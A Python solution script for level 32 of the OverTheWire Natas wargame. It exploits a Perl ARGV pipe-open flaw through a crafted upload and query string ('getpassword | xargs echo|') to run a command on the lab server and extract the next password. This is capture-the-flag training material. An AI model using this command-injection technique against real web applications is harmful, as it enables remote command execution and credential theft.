import requests
import re
from natas_utility import *

current_level = 32
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url + '?/var/www/natas/natas32/getpassword | xargs echo|'

session = requests.session()

data = {'file': 'ARGV'}
files = [('file', ('my_csv.csv', b'a,b\n1,2'))]

response = session.post(url, data=data, files=files, auth=auth)

password_regex = re.compile(r'<th>(.+)\n</th>')
next_password = password_regex.findall(response.content.decode('utf-8'))[0]
print(next_password)

save_credentials(current_level + 1, next_password)
